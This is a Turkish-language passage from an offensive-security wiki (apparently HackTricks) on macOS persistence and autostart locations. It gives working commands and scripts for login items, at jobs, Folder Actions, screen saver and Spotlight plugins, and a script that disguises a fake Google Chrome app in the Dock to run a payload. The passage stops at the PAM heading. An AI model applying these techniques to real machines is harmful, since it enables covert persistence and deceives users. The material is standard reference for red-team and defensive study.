#### Açıklama ve Sömürü

Varsayılan olarak, `/etc/ssh/sshd_config` dosyasında `PermitUserRC no` olmadığı sürece, bir kullanıcı **SSH üzerinden giriş yaptığında** **`/etc/ssh/sshrc`** ve **`~/.ssh/rc`** betikleri çalıştırılır.

### **Giriş Öğeleri**

Yazı: [https://theevilbit.github.io/beyond/beyond\_0003/](https://theevilbit.github.io/beyond/beyond\_0003/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak, `osascript`'i argümanlarla çalıştırmanız gerekiyor
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konumlar

* **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`**
* **Tetikleyici:** Giriş
* Sömürü yükü, **`osascript`** çağrısıyla depolanır
* **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`**
* **Tetikleyici:** Giriş
* Root gereklidir

#### Açıklama

Sistem Tercihleri -> Kullanıcılar ve Gruplar -> **Giriş Öğeleri** bölümünde, kullanıcının oturum açtığında çalıştırılacak **öğeleri bulabilirsiniz**.\
Onları komut satırından listelemek, eklemek ve kaldırmak mümkündür:
```bash
#List all items:
osascript -e 'tell application "System Events" to get the name of every login item'

#Add an item:
osascript -e 'tell application "System Events" to make login item at end with properties {path:"/path/to/itemname", hidden:false}'

#Remove an item:
osascript -e 'tell application "System Events" to delete login item "itemname"'
```
Bu öğeler, **`~/Library/Application Support/com.apple.backgroundtaskmanagementagent`** dosyasında saklanır.

**Oturum açma öğeleri**, [SMLoginItemSetEnabled](https://developer.apple.com/documentation/servicemanagement/1501557-smloginitemsetenabled?language=objc) API'si kullanılarak da belirtilebilir ve yapılandırma **`/var/db/com.apple.xpc.launchd/loginitems.501.plist`** dosyasında saklanır.

### Oturum Açma Öğesi Olarak ZIP

(Oturum Açma Öğeleri hakkında önceki bölümü kontrol edin, bu bir uzantıdır)

Bir **ZIP** dosyasını bir **Oturum Açma Öğesi** olarak saklarsanız, **`Archive Utility`** onu açacak ve örneğin **`~/Library`** içinde saklanan ve bir arka kapı içeren **`LaunchAgents/file.plist`** adlı bir Klasör içeren zip varsa, bu klasör oluşturulur (varsayılan olarak değil) ve plist eklenir, böylece kullanıcı bir sonraki oturum açtığında, plist'de belirtilen **arka kapı çalıştırılır**.

Başka bir seçenek, kullanıcı HOME içine **`.bash_profile`** ve **`.zshenv`** dosyalarını oluşturmaktır, böylece LaunchAgents klasörü zaten varsa bu teknik hala çalışır.

### At

Yazı: [https://theevilbit.github.io/beyond/beyond\_0014/](https://theevilbit.github.io/beyond/beyond\_0014/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak **`at`**'yi **yürütmeniz** ve etkin olması gerekmektedir
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`at`**'yi **yürütmeniz** ve etkin olması gerekmektedir

#### **Açıklama**

`at` görevleri, belirli zamanlarda yürütülecek **tek seferlik görevleri zamanlamak** için tasarlanmıştır. Cron işleriyle farklı olarak, `at` görevleri yürütme sonrasında otomatik olarak kaldırılır. Bu görevlerin sistem yeniden başlatmaları boyunca kalıcı olduğunu unutmamak önemlidir, bu da belirli koşullar altında potansiyel güvenlik endişeleri olarak işaretlenir.

**Varsayılan olarak** devre dışıdırlar, ancak **root** kullanıcısı bunları etkinleştirebilir:
```bash
sudo launchctl load -F /System/Library/LaunchDaemons/com.apple.atrun.plist
```
Bu, 1 saat içinde bir dosya oluşturacak:
```bash
echo "echo 11 > /tmp/at.txt" | at now+1
```
`atq` komutunu kullanarak iş kuyruğunu kontrol edin:
```shell-session
sh-3.2# atq
26	Tue Apr 27 00:46:00 2021
22	Wed Apr 28 00:29:00 2021
```
Yukarıda iki zamanlanmış iş görebiliriz. İşi ayrıntılarıyla yazdırmak için `at -c İŞNUMARASI` kullanabiliriz.
```shell-session
sh-3.2# at -c 26
#!/bin/sh
# atrun uid=0 gid=0
# mail csaby 0
umask 22
SHELL=/bin/sh; export SHELL
TERM=xterm-256color; export TERM
USER=root; export USER
SUDO_USER=csaby; export SUDO_USER
SUDO_UID=501; export SUDO_UID
SSH_AUTH_SOCK=/private/tmp/com.apple.launchd.co51iLHIjf/Listeners; export SSH_AUTH_SOCK
__CF_USER_TEXT_ENCODING=0x0:0:0; export __CF_USER_TEXT_ENCODING
MAIL=/var/mail/root; export MAIL
PATH=/usr/local/bin:/usr/bin:/bin:/usr/sbin:/sbin; export PATH
PWD=/Users/csaby; export PWD
SHLVL=1; export SHLVL
SUDO_COMMAND=/usr/bin/su; export SUDO_COMMAND
HOME=/var/root; export HOME
LOGNAME=root; export LOGNAME
LC_CTYPE=UTF-8; export LC_CTYPE
SUDO_GID=20; export SUDO_GID
_=/usr/bin/at; export _
cd /Users/csaby || {
echo 'Execution directory inaccessible' >&2
exit 1
}
unset OLDPWD
echo 11 > /tmp/at.txt
```
{% hint style="warning" %}
Eğer AT görevleri etkinleştirilmezse, oluşturulan görevler çalıştırılmaz.
{% endhint %}

**İş dosyaları**, `/private/var/at/jobs/` dizininde bulunabilir.
```
sh-3.2# ls -l /private/var/at/jobs/
total 32
-rw-r--r--  1 root  wheel    6 Apr 27 00:46 .SEQ
-rw-------  1 root  wheel    0 Apr 26 23:17 .lockfile
-r--------  1 root  wheel  803 Apr 27 00:46 a00019019bdcd2
-rwx------  1 root  wheel  803 Apr 27 00:46 a0001a019bdcd2
```
Dosya adı, sırayı, iş numarasını ve çalıştırılması planlanan zamanı içerir. Örneğin, `a0001a019bdcd2`'ye bir göz atalım.

* `a` - bu sıradır
* `0001a` - onaltılık iş numarası, `0x1a = 26`
* `019bdcd2` - onaltılık zaman. Bu, epoch'tan bu yana geçen dakikaları temsil eder. `0x019bdcd2`, ondalık olarak `26991826`'dır. 60 ile çarptığımızda `1619509560` elde ederiz, bu da `GMT: 2021 Nisan 27, Salı 7:46:00`'yi temsil eder.

İş dosyasını yazdırırsak, `at -c` kullanarak elde ettiğimiz bilgileri içerdiğini görürüz.

### Klasör Eylemleri

Yazı: [https://theevilbit.github.io/beyond/beyond\_0024/](https://theevilbit.github.io/beyond/beyond\_0024/)\
Yazı: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak, Klasör Eylemlerini yapılandırmak için **`System Events`** ile iletişim kurmak için `osascript`'i argümanlarla çağırabilmeniz gerekmektedir.
* TCC atlatma: [🟠](https://emojipedia.org/large-orange-circle)
* Masaüstü, Belgeler ve İndirilenler gibi bazı temel TCC izinlerine sahiptir.

#### Konum

* **`/Library/Scripts/Folder Action Scripts`**
* Kök izni gereklidir
* **Tetikleyici**: Belirtilen klasöre erişim
* **`~/Library/Scripts/Folder Action Scripts`**
* **Tetikleyici**: Belirtilen klasöre erişim

#### Açıklama ve Sömürü

Klasör Eylemleri, bir klasördeki değişiklikler (örneğin, öğe ekleme, kaldırma veya klasör penceresini açma veya yeniden boyutlandırma gibi diğer eylemler) tarafından otomatik olarak tetiklenen komut dosyalarıdır. Bu eylemler çeşitli görevler için kullanılabilir ve Finder UI veya terminal komutları kullanılarak tetiklenebilir.

Klasör Eylemleri kurmak için şu seçeneklere sahipsiniz:

1. [Automator](https://support.apple.com/guide/automator/welcome/mac) ile bir Klasör Eylemi iş akışı oluşturmak ve bir hizmet olarak yüklemek.
2. Bir klasörün bağlam menüsündeki Klasör Eylemleri Kurulumu aracılığıyla manuel olarak bir komut dosyası eklemek.
3. Programatik olarak bir Klasör Eylemi kurmak için Apple Event mesajlarını `System Events.app`'e göndermek için OSAScript'i kullanmak.
* Bu yöntem, eylemi sisteme gömmek ve kalıcılık düzeyi sunmak için özellikle kullanışlıdır.

Aşağıdaki komut dosyası, bir Klasör Eylemi tarafından yürütülebilecek bir örnektir:
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
Yukarıdaki betiği Klasör Eylemleri tarafından kullanılabilir hale getirmek için şu şekilde derleyin:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
Script derlendikten sonra, aşağıdaki komut dosyasını çalıştırarak Klasör Eylemlerini yapılandırın. Bu komut dosyası Klasör Eylemlerini genel olarak etkinleştirecek ve önceden derlenmiş komut dosyasını Masaüstü klasörüne özel olarak ekleyecektir. 

```bash
osascript -e 'tell application "Finder" to set folder actions enabled to true'
osascript -e 'tell application "Finder" to set the scriptFile to POSIX file "/path/to/compiled/script"'
osascript -e 'tell application "Finder" to set the folderPath to POSIX file "/path/to/Desktop"'
osascript -e 'tell application "Finder" to set the folderActions to folder actions of folder folderPath'
osascript -e 'tell application "Finder" to set the newAction to make new folder action at end of folderActions with properties {name:"My Folder Action", path:scriptFile}'
```
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events");
se.folderActionsEnabled = true;
var myScript = se.Script({name: "source.js", posixPath: "/tmp/source.js"});
var fa = se.FolderAction({name: "Desktop", path: "/Users/username/Desktop"});
se.folderActions.push(fa);
fa.scripts.push(myScript);
```
Kurulum betiğini şu şekilde çalıştırın:
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
* Bu kalıcılığı GUI aracılığıyla uygulamanın yolu budur:

Aşağıdaki betik çalıştırılacaktır:

{% code title="source.js" %}
```applescript
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
{% endcode %}

Bunu şu şekilde derleyin: `osacompile -l JavaScript -o folder.scpt source.js`

Şuraya taşıyın:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
Ardından, `Folder Actions Setup` uygulamasını açın, **izlemek istediğiniz klasörü** seçin ve durumunuzda **`folder.scpt`**'yi seçin (benim durumumda output2.scp olarak adlandırdım):

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1).png" alt="" width="297"><figcaption></figcaption></figure>

Şimdi, **Finder** ile o klasörü açarsanız, betiğiniz çalıştırılacaktır.

Bu yapılandırma, base64 formatında **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`** konumunda saklanmıştır.

Şimdi, GUI erişimi olmadan bu kalıcılığı hazırlamayı deneyelim:

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**'yi yedeklemek için `/tmp`'ye kopyalayın:
* `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. Şimdi, yeni ayarladığınız Klasör Eylemlerini **kaldırın**:

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

Şimdi boş bir ortama sahip olduğumuz için

3. Yedek dosyayı kopyalayın: `cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. Bu yapılandırmayı tüketmek için Klasör Eylemleri Kurulumu uygulamasını açın: `open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

{% hint style="danger" %}
Ve bu bana işe yaramadı, ancak bunlar yazıdan gelen talimatlar:(
{% endhint %}

### Dock kısayolları

Yazı: [https://theevilbit.github.io/beyond/beyond\_0027/](https://theevilbit.github.io/beyond/beyond\_0027/)

* Kum havuzunu atlamak için kullanışlı: [✅](https://emojipedia.org/check-mark-button)
* Ancak sistem içine kötü amaçlı bir uygulama yüklemiş olmanız gerekiyor
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `~/Library/Preferences/com.apple.dock.plist`
* **Tetikleyici**: Kullanıcının dock içindeki uygulamaya tıkladığında

#### Açıklama ve Sömürü

Dock'ta görünen tüm uygulamalar, plist içinde belirtilir: **`~/Library/Preferences/com.apple.dock.plist`**

Bir uygulama eklemek mümkündür sadece:

{% code overflow="wrap" %}
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
{% endcode %}

Bazı **sosyal mühendislik** kullanarak, örneğin dock içinde Google Chrome gibi **taklit yapabilir** ve aslında kendi betiğinizi çalıştırabilirsiniz:
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### Renk Seçicileri

Yazı: [https://theevilbit.github.io/beyond/beyond\_0017](https://theevilbit.github.io/beyond/beyond\_0017/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Çok belirli bir eylem gerçekleşmesi gerekiyor
* Başka bir kum havuzunda sonlanacaksınız
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/Library/ColorPickers`
* Root gerekli
* Tetikleyici: Renk seçiciyi kullanın
* `~/Library/ColorPickers`
* Tetikleyici: Renk seçiciyi kullanın

#### Açıklama ve Sömürü

Kodunuzla birlikte bir renk seçici paketi derleyin (örneğin [**bu örneği**](https://github.com/viktorstrate/color-picker-plus) kullanabilirsiniz) ve bir yapılandırıcı ekleyin (ekran koruyucu bölümündeki gibi) ve paketi `~/Library/ColorPickers` dizinine kopyalayın.

Ardından, renk seçici tetiklendiğinde kodunuz da tetiklenmelidir.

Kütüphanenizi yükleyen ikili dosyanın **çok kısıtlayıcı bir kum havuzu** olduğunu unutmayın: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`

{% code overflow="wrap" %}
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
{% endcode %}

### Finder Senkronizasyon Eklentileri

**Açıklama**: [https://theevilbit.github.io/beyond/beyond\_0026/](https://theevilbit.github.io/beyond/beyond\_0026/)\
**Açıklama**: [https://objective-see.org/blog/blog\_0x11.html](https://objective-see.org/blog/blog\_0x11.html)

* Sandbox'ı atlamak için kullanışlı mı?: **Hayır, çünkü kendi uygulamanızı yürütmeniz gerekmektedir**
* TCC atlaması: ???

#### Konum

* Belirli bir uygulama

#### Açıklama ve Sömürü

Bir Finder Senkronizasyon Uzantısı örneği olan bir uygulama [**burada bulunabilir**](https://github.com/D00MFist/InSync).

Uygulamalar `Finder Senkronizasyon Uzantıları`na sahip olabilir. Bu uzantı, yürütülecek bir uygulamanın içine yerleştirilir. Dahası, uzantının kodunu yürütebilmesi için **geçerli bir Apple geliştirici sertifikasıyla imzalanmış**, **sandbox'a alınmış** (rahatlatılmış istisnalar eklenmiş olabilir) ve bir şeye kaydedilmiş olması gerekmektedir:
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### Ekran Koruyucu

Yazı: [https://theevilbit.github.io/beyond/beyond\_0016/](https://theevilbit.github.io/beyond/beyond\_0016/)\
Yazı: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak, genel bir uygulama kum havuzunda sona ereceksiniz
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/System/Library/Screen Savers`
* Root gerekli
* **Tetikleyici**: Ekran koruyucusunu seçin
* `/Library/Screen Savers`
* Root gerekli
* **Tetikleyici**: Ekran koruyucusunu seçin
* `~/Library/Screen Savers`
* **Tetikleyici**: Ekran koruyucusunu seçin

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt="" width="375"><figcaption></figcaption></figure>

#### Açıklama ve Sömürü

Xcode'da yeni bir proje oluşturun ve yeni bir **Ekran Koruyucu** oluşturmak için şablonu seçin. Ardından, kodunuzu ekleyin, örneğin aşağıdaki kodu günlükler oluşturmak için kullanabilirsiniz.

**Derleyin** ve `.saver` paketini **`~/Library/Screen Savers`** dizinine kopyalayın. Ardından, Ekran Koruyucu GUI'sini açın ve üzerine tıkladığınızda birçok günlük oluşturması gerektiğini göreceksiniz:

{% code overflow="wrap" %}
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
{% endcode %}

{% hint style="danger" %}
Dikkat: Bu kodu yükleyen binary'nin (`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`) yetkilendirmeleri içinde **`com.apple.security.app-sandbox`** bulunduğundan dolayı **ortak uygulama sandbox'ında** olacaksınız.
{% endhint %}

Saver kodu:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Eklentileri

yazı: [https://theevilbit.github.io/beyond/beyond\_0011/](https://theevilbit.github.io/beyond/beyond\_0011/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak bir uygulama kum havuzunda sona ereceksiniz
* TCC atlatma: [🔴](https://emojipedia.org/large-red-circle)
* Kum havuzu çok sınırlı görünüyor

#### Konum

* `~/Library/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* `/Library/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Root yetkisi gerektirir
* `/System/Library/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Root yetkisi gerektirir
* `Some.app/Contents/Library/Spotlight/`
* **Tetikleyici**: Spotlight eklentisi tarafından yönetilen bir uzantıya sahip yeni bir dosya oluşturulduğunda.
* Yeni bir uygulama gereklidir

#### Açıklama ve Sömürü

Spotlight, macOS'in yerleşik bir arama özelliğidir ve kullanıcılara **bilgisayarlarındaki verilere hızlı ve kapsamlı erişim** sağlamak için tasarlanmıştır.\
Bu hızlı arama yeteneğini kolaylaştırmak için Spotlight, **özel bir veritabanı** tutar ve dosya adlarını ve içeriklerini analiz ederek bir indeks oluşturur, böylece hem dosya adları hem de içerikleri üzerinde hızlı aramalar yapılabilir.

Spotlight'ın temel mekanizması, 'mds' adı verilen merkezi bir süreçle gerçekleştirilir ve bu süreç, Spotlight hizmetini yönetir. Buna ek olarak, farklı dosya türlerini indeksleme gibi çeşitli bakım görevlerini gerçekleştiren birden fazla 'mdworker' daemonu bulunur (`ps -ef | grep mdworker`). Bu görevler, Spotlight içe aktarıcı eklentileri veya **".mdimporter paketleri**" aracılığıyla mümkün kılınır, bu sayede Spotlight'ın çeşitli dosya formatlarında içeriği anlamasına ve indekslemesine olanak tanır.

Eklentiler veya **`.mdimporter`** paketleri, önceden belirtilen yerlerde bulunur ve yeni bir paket göründüğünde dakikalar içinde yüklenir (herhangi bir hizmeti yeniden başlatmaya gerek yoktur). Bu paketler, hangi **dosya türü ve uzantıları yönetebileceklerini** belirtmelidir, bu şekilde Spotlight, belirtilen uzantıya sahip yeni bir dosya oluşturulduğunda onları kullanacaktır.

Yüklenmiş tüm `mdimporter`'ları bulmak mümkündür:
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
Ve örneğin **/Library/Spotlight/iBooksAuthor.mdimporter** bu tür dosyaları ayrıştırmak için kullanılır (`.iba` ve `.book` uzantıları dahil):
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
{% hint style="danger" %}
Diğer `mdimporter`'ların Plist'ini kontrol ederseniz, **`UTTypeConformsTo`** girişini bulamayabilirsiniz. Bu, yerleşik bir _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform\_Type\_Identifier)) olduğu için uzantıları belirtmeye gerek duymaz.

Ayrıca, Sistem varsayılan eklentileri her zaman önceliklidir, bu nedenle bir saldırgan yalnızca Apple'ın kendi `mdimporters` tarafından dizine alınmayan dosyalara erişebilir.
{% endhint %}

Kendi içe aktarıcınızı oluşturmak için bu projeye başlayabilirsiniz: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) ve ardından adı, **`CFBundleDocumentTypes`**'ı değiştirin ve **`UTImportedTypeDeclarations`** ekleyin, böylece desteklemek istediğiniz uzantıyı destekler ve bunları **`schema.xml`**'de yansıtın.\
Sonra **`GetMetadataForFile`** işlevinin kodunu değiştirerek, işlenen uzantıya sahip bir dosya oluşturulduğunda saldırı yükünüzü yürütün.

Son olarak, yeni `.mdimporter`'ınızı **bir önceki konumlardan birine inşa edin ve kopyalayın** ve yüklendiğinde **günlükleri izleyerek** veya **`mdimport -L.`** kontrol ederek kontrol edebilirsiniz.

### ~~Tercih Bölmesi~~

{% hint style="danger" %}
Bu artık çalışmıyor gibi görünmüyor.
{% endhint %}

Yazı: [https://theevilbit.github.io/beyond/beyond\_0009/](https://theevilbit.github.io/beyond/beyond\_0009/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Belirli bir kullanıcı eylemi gerektirir
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* **`/System/Library/PreferencePanes`**
* **`/Library/PreferencePanes`**
* **`~/Library/PreferencePanes`**

#### Açıklama

Bu artık çalışmıyor gibi görünmüyor.

## Kök Kum Havuzu Atlaması

{% hint style="success" %}
Burada, **kum havuzu atlamasına** izin veren ve **bir dosyaya yazarak** basitçe bir şeyi **kök olarak** yürütmenizi sağlayan ve/veya diğer **garip koşullar gerektiren** **başlangıç konumları** bulabilirsiniz.
{% endhint %}

### Periyodik

Yazı: [https://theevilbit.github.io/beyond/beyond\_0019/](https://theevilbit.github.io/beyond/beyond\_0019/)

* Kum havuzunu atlamak için kullanışlı: [🟠](https://emojipedia.org/large-orange-circle)
* Ancak kök olmanız gerekiyor
* TCC atlaması: [🔴](https://emojipedia.org/large-red-circle)

#### Konum

* `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
* Kök gereklidir
* **Tetikleyici**: Zaman geldiğinde
* `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local`
* Kök gereklidir
* **Tetikleyici**: Zaman geldiğinde

#### Açıklama ve Sömürü

Periyodik komut dosyaları (**`/etc/periodic`**), `/System/Library/LaunchDaemons/com.apple.periodic*`'de yapılandırılan **başlatma hizmetleri** nedeniyle yürütülür. `/etc/periodic/`'de depolanan komut dosyalarının, dosyanın sahibi olarak **yürütüldüğünü** unutmayın, bu nedenle potansiyel bir ayrıcalık yükseltme için çalışmayacaktır.

{% code overflow="wrap" %}
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
{% endcode %}

**`/etc/defaults/periodic.conf`** dosyasında belirtilen diğer periyodik betikler de çalıştırılacaktır:
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
Eğer `/etc/daily.local`, `/etc/weekly.local` veya `/etc/monthly.local` dosyalarından herhangi birini yazmayı başarırsanız, **daha önce veya daha sonra çalıştırılacaktır**.

{% hint style="warning" %}
Dikkat edin, periyodik betik, **betiğin sahibi olarak çalıştırılacaktır**. Yani, eğer bir düzenli kullanıcı betiğin sahibi ise, betik o kullanıcı olarak çalıştırılacaktır (bu, ayrıcalık yükseltme saldırılarını önleyebilir).
{% endhint %}

### PAM

Yazı: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Yazı: [https://theevilbit.github.io/beyond/beyond\_0005/](https://theevilbit.github.io/beyond/beyond\_0005/)

